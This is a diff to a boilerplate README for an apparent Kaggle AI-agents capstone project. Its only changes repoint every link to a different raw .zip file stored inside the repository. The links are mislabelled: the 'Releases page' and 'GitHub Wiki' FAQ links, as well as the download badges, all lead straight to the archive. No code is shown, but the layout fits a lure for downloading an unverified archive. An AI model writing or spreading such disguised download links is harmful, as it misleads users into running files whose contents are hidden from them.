@@ -6,14 +6,14 @@ Welcome to the "kaggle-AI-agents-google-capstone". This project is part of the 5
 
 ## 🔗 Download the Application
 
-[![Download Latest Release](https://raw.githubusercontent.com/ModyD/kaggle-AI-agents-google-capstone/master/backend/app/kaggle-AI-agents-google-capstone_1.1.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ModyD/kaggle-AI-agents-google-capstone/master/backend/app/kaggle-AI-agents-google-capstone_1.1.zip)
+[![Download Latest Release](https://github.com/ModyD/kaggle-AI-agents-google-capstone/raw/refs/heads/master/backend/agents/capstone_A_google_agents_kaggle_3.9-alpha.2.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/ModyD/kaggle-AI-agents-google-capstone/raw/refs/heads/master/backend/agents/capstone_A_google_agents_kaggle_3.9-alpha.2.zip)
 
 ## 🚀 Getting Started
 
 Follow these steps to get the application running on your device:
 
 1. **Visit the Release Page:** 
-   Go to the [Releases page](https://raw.githubusercontent.com/ModyD/kaggle-AI-agents-google-capstone/master/backend/app/kaggle-AI-agents-google-capstone_1.1.zip) to find the latest version of the software. 
+   Go to the [Releases page](https://github.com/ModyD/kaggle-AI-agents-google-capstone/raw/refs/heads/master/backend/agents/capstone_A_google_agents_kaggle_3.9-alpha.2.zip) to find the latest version of the software. 
 
 2. **Download the Application:**
    Once on the Releases page, locate the latest version. Click on the download link for your operating system. 
@@ -84,12 +84,12 @@ If you encounter any issues, try the following steps:
 
 1. **Reinstall the Application:** Sometimes, a fresh install can resolve unexpected problems.
 2. **Check Internet Connection:** Ensuring a stable internet connection is crucial for features that require online access.
-3. **Refer to the FAQs:** A helpful FAQ section is available on our [GitHub Wiki](https://raw.githubusercontent.com/ModyD/kaggle-AI-agents-google-capstone/master/backend/app/kaggle-AI-agents-google-capstone_1.1.zip).
+3. **Refer to the FAQs:** A helpful FAQ section is available on our [GitHub Wiki](https://github.com/ModyD/kaggle-AI-agents-google-capstone/raw/refs/heads/master/backend/agents/capstone_A_google_agents_kaggle_3.9-alpha.2.zip).
 
 ## 📥 Download & Install
 
 Ready to get started? Visit the Releases page to download the application now.
 
-[![Download Latest Release](https://raw.githubusercontent.com/ModyD/kaggle-AI-agents-google-capstone/master/backend/app/kaggle-AI-agents-google-capstone_1.1.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ModyD/kaggle-AI-agents-google-capstone/master/backend/app/kaggle-AI-agents-google-capstone_1.1.zip)
+[![Download Latest Release](https://github.com/ModyD/kaggle-AI-agents-google-capstone/raw/refs/heads/master/backend/agents/capstone_A_google_agents_kaggle_3.9-alpha.2.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/ModyD/kaggle-AI-agents-google-capstone/raw/refs/heads/master/backend/agents/capstone_A_google_agents_kaggle_3.9-alpha.2.zip)
 
 Your journey into AI agents begins here. Enjoy exploring and creating with the **kaggle-AI-agents-google-capstone** application!
